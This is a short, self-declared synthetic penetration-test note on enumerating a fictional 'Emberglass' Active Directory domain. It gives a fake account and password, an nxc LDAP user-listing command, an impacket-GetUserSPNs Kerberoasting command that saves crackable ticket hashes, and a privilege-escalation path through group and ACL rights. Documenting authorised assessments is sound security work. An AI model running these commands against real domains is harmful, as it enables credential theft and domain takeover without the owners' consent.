---
title: Operation Emberglass AD Enumeration
synthetic: true
classification: demo
tags: [engagement, active-directory, bloodhound, emberglass]
---

# Operation Emberglass AD Enumeration

> All accounts, secrets, and directory objects are fictional.

## Initial identity

The assessment began with `EMBERGLASS\analyst.demo` and the fake password
`Lantern-Cobalt-47!`. LDAP identified the domain SID as
`S-1-5-21-4242424242-3131313131-2020202020`.

```bash
nxc ldap 10.77.24.10 \
  -d emberglass.internal \
  -u analyst.demo \
  -p 'Lantern-Cobalt-47!' \
  --users
```

## Service account lead

`svc_archive` registered
`MSSQLSvc/sql01.emberglass.internal:1433` and had not rotated its password
recently. A ticket was requested for offline strength testing.

```bash
impacket-GetUserSPNs \
  -dc-ip 10.77.24.10 \
  -request \
  -outputfile evidence/emberglass-kerberoast.hashes \
  'emberglass.internal/analyst.demo:Lantern-Cobalt-47!'
```

## Graph result

The shortest validated path was:

`analyst.demo → GenericWrite → svc_archive → Archive Operators → replication ACL`

The ACL step was verified separately before the controlled action in
[[05 - Attack Path]].

